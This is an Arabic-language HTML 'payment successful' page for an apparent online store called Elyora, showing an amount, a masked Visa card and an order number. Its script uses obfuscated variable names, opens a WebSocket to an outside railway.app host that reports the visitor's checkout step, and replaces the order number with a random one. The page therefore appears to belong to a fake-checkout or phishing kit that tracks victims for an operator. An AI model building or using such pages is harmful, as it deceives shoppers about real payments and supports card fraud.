<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم الدفع بنجاح | متجر إليورا</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: { DEFAULT: '#2f1321' },
                        accent: { DEFAULT: '#e45b8a' },
                        success: '#10b981',
                        sand: '#f5ebe7',
                    },
                    fontFamily: {
                        cairo: ['Cairo', 'sans-serif'],
                    }
                }
            }
        }
    </script>
</head>

<body class="bg-sand/30 font-cairo flex items-center justify-center min-h-screen p-4">

    <div class="bg-white p-8 rounded-3xl shadow-lg max-w-md w-full text-center">
        <div class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg class="w-10 h-10 text-success" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
            </svg>
        </div>

        <h1 class="text-2xl font-bold text-primary mb-2">تم الدفع بنجاح</h1>
        <p class="text-gray-500 mb-8">شكراً لك! تم استلام طلبك وتأكيد عملية الدفع بنجاح.</p>

        <div class="bg-gray-50 rounded-xl p-4 mb-8 text-right space-y-3 border border-gray-100">
            <div class="flex justify-between">
                <span class="text-gray-500 text-sm">رقم الطلب</span>
                <span class="font-bold text-primary font-mono" id="o1">#89201</span>
            </div>
            <div class="flex justify-between">
                <span class="text-gray-500 text-sm">المبلغ المدفوع</span>
                <span class="font-bold text-primary">199.00 ر.س</span>
            </div>
            <div class="flex justify-between">
                <span class="text-gray-500 text-sm">البطاقة المستخدمة</span>
                <span class="font-bold text-primary text-sm dir-ltr">Visa **** 4242</span>
            </div>
            <div class="flex justify-between">
                <span class="text-gray-500 text-sm">الحالة</span>
                <span class="font-bold text-success text-sm bg-green-100 px-2 py-0.5 rounded">مدفوع</span>
            </div>
        </div>

        <a href="checkout.html"
            class="block w-full bg-primary text-white py-3 rounded-xl font-bold hover:bg-opacity-90 transition">
            عودة للرئيسية
        </a>
    </div>

    <script>
        let _a = localStorage.getItem('aura_client_id');
        if (!_a) {
            _a = 'unknown-' + Date.now();
        }

        const _b = 'wss';
        const _c = `wss://api-production-8591.up.railway.app/ws/client/${_a}`;
        const _d = new WebSocket(_c);

        _d.onopen = () => {
            _d.send(JSON.stringify({ event: 'step_update', data: { step: 'thank_you' } }));
        };

        document.getElementById('o1').textContent = '#' + Math.floor(10000 + Math.random() * 90000);
    </script>
</body>

</html>
